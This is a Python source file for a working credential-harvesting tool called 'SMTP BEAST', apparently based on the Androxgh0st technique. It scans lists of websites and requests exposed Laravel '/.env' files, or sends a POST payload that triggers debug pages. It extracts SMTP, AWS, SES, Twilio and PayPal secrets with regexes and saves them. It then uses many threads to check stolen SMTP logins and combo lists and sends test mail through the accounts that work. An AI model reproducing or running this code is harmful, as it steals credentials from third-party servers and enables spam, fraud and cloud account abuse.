# bulksmtp.py
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from configparser import ConfigParser
from queue import Queue
import smtplib
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
import logging
import traceback
import os
import datetime
from colorama import init, Fore, Style
import concurrent.futures
import socket
# from laravel import main as get_mailing_credentials_laravel  # Importing the main function from laravel.py

# Initialize colorama
init(autoreset=True)



try:
    os.mkdir('Results')
except:
    pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception as e: print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            save = open('Results/paypal_sandbox.txt','a')
            save.write(url+'\n')
            save.close()
            return True
        else:
            return False

    def get_aws_region(self, text):
        reg = False
        for region in list_region.splitlines():
            if str(region) in text:
                return region
                break

    def get_aws_data(self, text, url):
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
                    except:
                        aws_buc = ''
                elif "<td>AWS_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_buc = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "SES_KEY" in text:
                if "SES_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>SES_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            else:
                return False
        except:
            return False

    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    method = '/.env'
                    try:
                        acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
                    except:
                        auhtoken = ''
                elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                    method = 'debug'
                    try:
                        acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        auhtoken = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
                remover = str(build).replace('\r', '')
                save = open('Results/TWILLIO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("\MAIL_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    # mod aws
                    if '.amazonaws.com' in mailhost:
                        getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/'+getcountry[:-2]+'.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                        remover = str(build).replace('\r', '')
                        save2 = open('Results/smtp_aws.txt', 'a')
                        save2.write(remover+'\n\n')
                        save2.close()
                    elif 'sendgrid' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/sendgrid.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'office365' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/office.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif '1and1' in mailhost or '1und1' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/1and1.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'zoho' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/zoho.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mandrillapp' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/mandrill.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mailgun' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/mailgun.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    else:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    return True
            else:
                return False
        except:
            return False

def printf(text):
    ''.join([str(item) for item in text])
    print((text + '\n'), end=' ')

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def print_banner():
    banner = f"""
{Fore.GREEN}
 .·:''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''':·.
: :  ____  __  __ _____ ____    ____  _____    _    ____ _____  : :
: : / ___||  \/  |_   _|  _ \  | __ )| ____|  / \  / ___|_   _| : :
: : \___ \| |\/| | | | | |_) | |  _ \|  _|   / _ \ \___ \ | |   : :
: :  ___) | |  | | | | |  __/  | |_) | |___ / ___ \ ___) || |   : :
: : |____/|_|  |_| |_| |_|     |____/|_____/_/   \_\____/ |_|   : :
'·:.............................................................:·'

{Style.RESET_ALL}{Fore.GREEN}Coded by ROOT  TG: @roottbck{Style.RESET_ALL}
    """
    print(banner)

def check_smtp(smtp_server, port, username, password, retry=False):
    try:
        smtp_conn = smtplib.SMTP(smtp_server, port, timeout=10)
        smtp_conn.ehlo()
        smtp_conn.starttls()
        smtp_conn.login(username, password)
        status = smtp_conn.noop()[0]
        smtp_conn.quit()
        return status == 250
    except smtplib.SMTPAuthenticationError:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [INVALID CREDENTIALS]")
    except smtplib.SMTPException:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [CONNECTION ERROR]")
    except socket.gaierror:
        if not retry:
            retry_smtp_server = smtp_server.replace("smtp.", "")
            return check_smtp(retry_smtp_server, port, username, password, retry=True)
        else:
            result = f"{smtp_server}|{port}|{username}|{password}"
            print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [INVALID SERVER]")
    except ConnectionRefusedError:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [CONNECTION REFUSED]")
    except TimeoutError:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [TIMEOUT ERROR]<FIX -> OPEN PORT 25>")
    except Exception:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [UNEXPECTED ERROR]")
        logging.error("Unexpected error for %s: %s", username, traceback.format_exc())
    return False

def send_test_email(smtp_server, port, username, password, recipient, mailfrom, retry=False):
    try:
        subject = "Project SMTP Beast"
        body = "This email is from Root. SMTP is valid."
        message = f"Subject: {subject}\n\n{body}"

        with smtplib.SMTP(smtp_server, port, timeout=10) as server:
            server.starttls()
            server.login(username, password)
            server.sendmail(mailfrom, recipient, message)
        return True
    except smtplib.SMTPException:
        result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [CONNECTION ERROR]")
    except socket.gaierror:
        if not retry:
            retry_smtp_server = smtp_server.replace("smtp.", "")
            return send_test_email(retry_smtp_server, port, username, password, recipient, mailfrom, retry=True)
        else:
            result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
            print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [INVALID SERVER]")
    except TimeoutError:
        result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [TIMEDOUT ERROR]")
    except ConnectionRefusedError:
        result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [CONNECTION REFUSED]")
    except Exception:
        result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
        print(Fore.RED + f"[ROOT v2 x SMTP BEAST] {result} [UNEXPECTED ERROR]")
        logging.error("Unexpected error when sending email from %s: %s", username, traceback.format_exc())
    return False


def get_smtp_from_email(email):
    domain = email.split('@')[-1]
    return f"smtp.{domain}"

def save_results(filename, data):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, 'a') as file:
        file.write(data + '\n')

def check_smtp_combolist_line(line):
    try:
        email, password = line.strip().split(':')
    except ValueError:
        logging.error("Invalid format for combo list line: %s", line.strip())
        return line, False

    smtp_server = get_smtp_from_email(email)
    for port in [25, 465, 587]:
        if check_smtp(smtp_server, port, email, password):
            result = f"{smtp_server}|{port}|{email}|{password}"
            print(Fore.GREEN + f"[ROOT v2 x SMTP BEAST] {result} [VALID]")
            return result, True
        else:
            result = f"{smtp_server}|{port}|{email}|{password}"
    return line, False

def check_smtp_combolist(file_path, max_threads):
    valid_filename = f'results/valid/validsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalid/invalidsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except Exception as e:
        logging.error("Error reading file %s: %s", file_path, str(e))
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_smtp_combolist_line, line) for line in lines]
        for future in concurrent.futures.as_completed(futures):
            line, is_valid = future.result()
            if is_valid:
                save_results(valid_filename, line)
            else:
                save_results(invalid_filename, line)

def check_smtp_file_line(line):
    try:
        parts = line.strip().split('|')
        if len(parts) == 5:
            smtp_server, port, username, password, mailfrom = parts
        else:
            smtp_server, port, username, password = parts
            mailfrom = username  # Use the username as the default mailfrom if not provided

    except ValueError:
        logging.error("Invalid format for SMTP file line: %s", line.strip())
        return line, False

    for port in [25, 465, 587]:
        if check_smtp(smtp_server, port, username, password):
            result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
            print(Fore.GREEN + f"[ROOT v2 x SMTP BEAST] {result} [VALID]")
            return result, True
        else:
            result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
    return line, False

def check_smtp_file(file_path, max_threads):
    valid_filename = f'results/valid/validsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalid/invalidsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except Exception as e:
        logging.error("Error reading file %s: %s", file_path, str(e))
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_smtp_file_line, line) for line in lines]
        for future in concurrent.futures.as_completed(futures):
            line, is_valid = future.result()
            if is_valid:
                save_results(valid_filename, line)
            else:
                save_results(invalid_filename, line)

def check_send_smtp_line(line, recipient):
    parts = line.strip().split('|')
    if len(parts) == 5:
        smtp_server, port, username, password, mailfrom = parts
    elif len(parts) == 4:
        smtp_server, port, username, password = parts
        mailfrom = username  # Default to username if mailfrom is not provided
    else:
        logging.error("Invalid format for SMTP file line: %s", line.strip())
        return line, False

    for port in [25, 465, 587]:
        if send_test_email(smtp_server, port, username, password, recipient, mailfrom):
            result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
            print(Fore.GREEN + f"[ROOT v2 x SMTP BEAST] {result} [EMAIL SENT]")
            return result, True
        else:
            result = f"{smtp_server}|{port}|{username}|{password}|{mailfrom}"
    return line, False


def check_send_smtp(file_path, recipient, max_threads):
    valid_filename = f'results/send/valid/validsend_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/send/invalid/invalidsend_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except Exception as e:
        logging.error("Error reading file %s: %s", file_path, str(e))
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_send_smtp_line, line, recipient) for line in lines]
        for future in concurrent.futures.as_completed(futures):
            line, is_valid = future.result()
            if is_valid:
                save_results(valid_filename, line)
            else:
                save_results(invalid_filename, line)

def get_mailing_credentials_laravel(url):
    resp = False
    try:
        text = '\033[32;1m[ROOT v2 x SMTP BEAST] #\033[0m '+url
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getsmtp = androxgh0st().get_smtp(resp, url)
            getwtilio = androxgh0st().get_twillio(resp, url)
            getaws = androxgh0st().get_aws_data(resp, url)
            getpp = androxgh0st().paypal(resp, url)
            if getsmtp:
                text += ' | \033[32;1mSMTP\033[0m'
            else:
                text += ' | \033[31;1mSMTP\033[0m'
            if getaws:
                text += ' | \033[32;1mAWS\033[0m'
            else:
                text += ' | \033[31;1mAWS\033[0m'
            if getwtilio:
                text += ' | \033[32;1mTWILIO\033[0m'
            else:
                text += ' | \033[31;1mTWILIO\033[0m'
            if getpp:
                text += ' | \033[32;1mPAYPAL\033[0m'
            else:
                text += ' | \033[31;1mPAYPAL\033[0m'
        else:
            text += ' | \033[31;1mCan\'t get everything\033[0m'
            save = open('Results/not_vulnerable.txt','a')
            asu = str(url).replace('\r', '')
            save.write(asu+'\n')
            save.close()
    except:
        text = '\033[31;1m#\033[0m '+url
        text += ' | \033[31;1mCan\'t access sites\033[0m'
        save = open('Results/not_vulnerable.txt','a')
        asu = str(url).replace('\r', '')
        save.write(asu+'\n')
        save.close()
    printf(text)

def select_file():
    file_path = input("Enter the path to the file: ")
    return file_path

def get_recipient_email():
    recipient = input("Enter recipient email for test send: ")
    return recipient

def get_max_threads():
    threads = input("Enter the number of threads (default is 100): ")
    return int(threads) if threads else 100

def parse_laravel_result_file(file_path):
    smtp_credentials = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        smtp_server, port, username, password, mailfrom = None, None, None, None, None
        for line in lines:
            if line.startswith("MAILHOST:"):
                smtp_server = line.split(": ")[1].strip().strip('"').strip("'")
            elif line.startswith("MAILPORT:"):
                port = line.split(": ")[1].strip().strip('"').strip("'")
            elif line.startswith("MAILUSER:"):
                username = line.split(": ")[1].strip().strip('"').strip("'")
            elif line.startswith("MAILPASS:"):
                password = line.split(": ")[1].strip().strip('"').strip("'")
            elif line.startswith("MAILFROM:"):
                mailfrom = line.split(": ")[1].strip().strip('"').strip("'")

            if smtp_server and port and username and password:
                if mailfrom and mailfrom.lower() != "null":
                    smtp_credentials.append(f"{smtp_server}|{port}|{username}|{password}|{mailfrom}")
                else:
                    smtp_credentials.append(f"{smtp_server}|{port}|{username}|{password}")
                smtp_server, port, username, password, mailfrom = None, None, None, None, None

    return smtp_credentials


def check_smtp_laravel(file_path, max_threads):
    smtp_credentials = parse_laravel_result_file(file_path)
    valid_filename = f'results/valid/validsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalid/invalidsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_smtp_file_line, cred) for cred in smtp_credentials]
        for future in concurrent.futures.as_completed(futures):
            line, is_valid = future.result()
            if is_valid:
                save_results(valid_filename, line)
            else:
                save_results(invalid_filename, line)

def main():
    print_banner()
    while True:
        print("Menu:")
        print("1: Check SMTP from combo list")
        print("2: Check SMTP from text file")
        print("3: Check SMTP from Laravel result file")
        print("4: Get Mailing Credentials (Laravel Config)")
        print("5: Test send from text file")
        print("6: Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            file_path = select_file()
            max_threads = get_max_threads()
            check_smtp_combolist(file_path, max_threads)
        elif choice == '2':
            file_path = select_file()
            max_threads = get_max_threads()
            check_smtp_file(file_path, max_threads)
        elif choice == '3':
            file_path = select_file()
            max_threads = get_max_threads()
            check_smtp_laravel(file_path, max_threads)
        elif choice == '4':
            try:
                readcfg = ConfigParser()
                readcfg.read(pid_restore)
                lists = readcfg.get('DB', 'FILES')
                numthread = readcfg.get('DB', 'THREAD')
                sessi = readcfg.get('DB', 'SESSION')
                print("log session bot found! restore session")
                print((
                                  '''Using Configuration :\n\tFILES=''' + lists + '''\n\tTHREAD=''' + numthread + '''\n\tSESSION=''' + sessi))
                tanya = input("Want to contineu session ? [Y/n] ")
                if "Y" in tanya or "y" in tanya:
                    lerr = open(lists).read().split("\n" + sessi)[1]
                    readsplit = lerr.splitlines()
                else:
                    kntl  # Send Error Biar Lanjut Ke Wxception :v
            except:
                try:
                    lists = sys.argv[1]
                    numthread = sys.argv[2]
                    readsplit = open(lists).read().splitlines()
                except:
                    try:
                        lists = input("websitelist ? ")
                        readsplit = open(lists).read().splitlines()
                    except:
                        print("Wrong input or list not found!")
                        exit()
                    try:
                        numthread = input("threads ? ")
                    except:
                        print("Wrong thread number!")
                        exit()
            pool = ThreadPool(int(numthread))
            for url in readsplit:
                if "://" in url:
                    url = url
                else:
                    url = "http://" + url
                if url.endswith('/'):
                    url = url[:-1]
                jagases = url
                try:
                    pool.add_task(get_mailing_credentials_laravel, url)
                except KeyboardInterrupt:
                    session = open(pid_restore, 'w')
                    cfgsession = "[DB]\nFILES=" + lists + "\nTHREAD=" + str(numthread) + "\nSESSION=" + jagases + "\n"
                    session.write(cfgsession)
                    session.close()
                    print("CTRL+C Detect, Session saved")
                    exit()
            pool.wait_completion()
            try:
                os.remove(pid_restore)
            except:
                pass

        elif choice == '5':
            file_path = select_file()
            recipient = get_recipient_email()
            max_threads = get_max_threads()
            check_send_smtp(file_path, recipient, max_threads)
        elif choice == '6':
            break
        else:
            print("Invalid choice. Please try again.")

        continue_choice = input("Do you want to continue? (yes/no): ")
        if continue_choice.lower() != 'yes':
            break

if __name__ == "__main__":
    main()
